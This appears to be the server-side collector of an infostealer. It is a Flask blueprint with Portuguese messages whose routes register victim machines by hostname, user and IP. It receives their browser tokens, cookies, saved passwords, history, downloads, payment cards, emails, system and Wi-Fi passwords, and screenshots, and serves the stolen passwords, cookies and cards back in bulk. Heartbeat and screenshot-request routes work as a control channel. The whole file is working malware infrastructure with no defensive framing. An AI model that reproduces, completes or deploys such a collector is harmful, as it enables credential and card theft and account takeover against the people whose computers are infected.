from datetime import datetime
from flask import Blueprint, jsonify, request
from .auth import require_login
import store

collector_bp = Blueprint('collector', __name__)

@collector_bp.route('/api/register', methods=['POST'])
def register_endpoint():
    try:
        data = request.get_json()
        endpoint_id = data.get('id') or data.get('endpoint_id')
        
        if not endpoint_id:
            return jsonify({'error': 'ID é obrigatório'}), 400
        
        store.endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', '0.0.0.0'),
            'external_ip': data.get('external_ip', '0.0.0.0'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        print(f"[API] Endpoint registrado: {endpoint_id}")
        return jsonify({'success': True, 'message': 'Endpoint registrado'})
    except Exception as e:
        print(f"[API] Erro ao registrar endpoint: {e}")
        return jsonify({'error': str(e)}), 500

@collector_bp.route('/api/full_report', methods=['POST'])
def receive_full_report():
    try:
        data = request.get_json()
        endpoint_id = data.get('endpoint_id')
        report_data = data.get('report_data', {})
        
        if not endpoint_id:
            return jsonify({'error': 'endpoint_id é obrigatório'}), 400
            
        if 'browser_data' in report_data:
            for browser_name, b_data in report_data['browser_data'].items():
                if b_data.get('tokens'):
                    if endpoint_id not in store.endpoint_tokens: store.endpoint_tokens[endpoint_id] = {'tokens': []}
                    store.endpoint_tokens[endpoint_id]['tokens'].extend(b_data['tokens'])
                if b_data.get('cookies'):
                    if endpoint_id not in store.endpoint_cookies: store.endpoint_cookies[endpoint_id] = {'cookies': []}
                    store.endpoint_cookies[endpoint_id]['cookies'].extend(b_data['cookies'])
                if b_data.get('passwords'):
                    if endpoint_id not in store.endpoint_passwords: store.endpoint_passwords[endpoint_id] = {'passwords': []}
                    store.endpoint_passwords[endpoint_id]['passwords'].extend(b_data['passwords'])
                if b_data.get('history'):
                    if endpoint_id not in store.endpoint_history: store.endpoint_history[endpoint_id] = {'history': []}
                    store.endpoint_history[endpoint_id]['history'].extend(b_data['history'])
        
        if report_data.get('emails'):
            if endpoint_id not in store.endpoint_emails: store.endpoint_emails[endpoint_id] = {'emails': []}
            store.endpoint_emails[endpoint_id]['emails'].extend(report_data['emails'])
            
        if report_data.get('system_passwords'):
            if endpoint_id not in store.endpoint_system_passwords: store.endpoint_system_passwords[endpoint_id] = {'passwords': []}
            store.endpoint_system_passwords[endpoint_id]['passwords'].extend(report_data['system_passwords'])
            
        if report_data.get('wifi_passwords'):
            if endpoint_id not in store.endpoint_wifi_passwords: store.endpoint_wifi_passwords[endpoint_id] = {'passwords': []}
            store.endpoint_wifi_passwords[endpoint_id]['passwords'].extend(report_data['wifi_passwords'])
            
        if 'system_info' in report_data:
            store.endpoint_system_info[endpoint_id] = report_data['system_info']
            
        if report_data.get('screenshot'):
            store.endpoint_screenshots[endpoint_id] = {
                'image': report_data['screenshot'],
                'timestamp': report_data.get('timestamp', datetime.now().isoformat())
            }
            
        if endpoint_id in store.endpoints:
            metadata = report_data.get('metadata', {})
            store.endpoints[endpoint_id].update({
                'last_seen': datetime.now().strftime('%H:%M:%S'),
                'platform': metadata.get('platform', store.endpoints[endpoint_id].get('platform', 'Unknown')),
                'ram': metadata.get('ram', store.endpoints[endpoint_id].get('ram', 'Unknown'))
            })
            
        print(f"[API] Relatório recebido de {endpoint_id}")
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@collector_bp.route('/api/browser_data', methods=['POST'])
def receive_browser_data():
    data = request.get_json()
    endpoint_id = data.get('endpoint_id', 'unknown')
    if endpoint_id not in store.endpoints:
        store.endpoints[endpoint_id] = {}
    store.endpoints[endpoint_id]['browser_data'] = data
    store.endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
    return jsonify({'status': 'success'})

@collector_bp.route('/api/passwords_data', methods=['GET', 'POST'])
def passwords_data():
    if request.method == 'POST':
        data = request.get_json()
        endpoint_id = data.get('endpoint_id', 'unknown')
        if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
        if 'passwords' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['passwords'] = []
        store.endpoints[endpoint_id]['passwords'].extend(data.get('passwords', []))
        return jsonify({'status': 'success'})
    all_passwords = []
    for ep_id, ep_data in store.endpoints.items():
        if 'passwords' in ep_data:
            for pwd in ep_data['passwords']:
                pwd['endpoint_id'] = ep_id
                all_passwords.append(pwd)
    return jsonify(all_passwords)

@collector_bp.route('/api/cookies_data', methods=['GET', 'POST'])
def cookies_data():
    if request.method == 'POST':
        data = request.get_json()
        endpoint_id = data.get('endpoint_id', 'unknown')
        if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
        if 'cookies' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['cookies'] = []
        store.endpoints[endpoint_id]['cookies'].extend(data.get('cookies', []))
        return jsonify({'status': 'success'})
    all_cookies = []
    for ep_id, ep_data in store.endpoints.items():
        if 'cookies' in ep_data:
            for cookie in ep_data['cookies']:
                cookie['endpoint_id'] = ep_id
                all_cookies.append(cookie)
    return jsonify(all_cookies)

@collector_bp.route('/api/history_data', methods=['GET', 'POST'])
def history_data():
    if request.method == 'POST':
        data = request.get_json()
        endpoint_id = data.get('endpoint_id', 'unknown')
        if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
        if 'history' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['history'] = []
        store.endpoints[endpoint_id]['history'].extend(data.get('history', []))
        return jsonify({'status': 'success'})
    all_history = []
    for ep_id, ep_data in store.endpoints.items():
        if 'history' in ep_data:
            for hist in ep_data['history']:
                hist['endpoint_id'] = ep_id
                all_history.append(hist)
    return jsonify(all_history)

@collector_bp.route('/api/downloads_data', methods=['GET', 'POST'])
def downloads_data():
    if request.method == 'POST':
        data = request.get_json()
        endpoint_id = data.get('endpoint_id', 'unknown')
        if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
        if 'downloads' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['downloads'] = []
        store.endpoints[endpoint_id]['downloads'].extend(data.get('downloads', []))
        return jsonify({'status': 'success'})
    all_downloads = []
    for ep_id, ep_data in store.endpoints.items():
        if 'downloads' in ep_data:
            for dl in ep_data['downloads']:
                dl['endpoint_id'] = ep_id
                all_downloads.append(dl)
    return jsonify(all_downloads)

@collector_bp.route('/api/cards_data', methods=['GET', 'POST'])
def cards_data():
    if request.method == 'POST':
        data = request.get_json()
        endpoint_id = data.get('endpoint_id', 'unknown')
        if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
        if 'cards' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['cards'] = []
        store.endpoints[endpoint_id]['cards'].extend(data.get('cards', []))
        return jsonify({'status': 'success'})
    all_cards = []
    for ep_id, ep_data in store.endpoints.items():
        if 'cards' in ep_data:
            for card in ep_data['cards']:
                card['endpoint_id'] = ep_id
                all_cards.append(card)
    return jsonify(all_cards)

@collector_bp.route('/api/metrics', methods=['POST'])
def receive_metrics():
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', {})
        if endpoint_id:
            store.metrics_data.append({
                'endpoint_id': endpoint_id,
                'metrics': metrics,
                'timestamp': datetime.now().isoformat()
            })
            return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@collector_bp.route('/api/heartbeat', methods=['POST'])
def receive_heartbeat():
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        status = data.get('status', 'unknown')
        if endpoint_id in store.endpoints:
            store.endpoints[endpoint_id]['last_seen'] = datetime.now().isoformat()
            store.endpoints[endpoint_id]['status'] = status
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@collector_bp.route('/api/screenshot_requests/<endpoint_id>')
def check_screenshot_request(endpoint_id):
    if endpoint_id in store.screenshot_requests:
        return jsonify(store.screenshot_requests[endpoint_id])
    return jsonify({'request_screenshot': False})
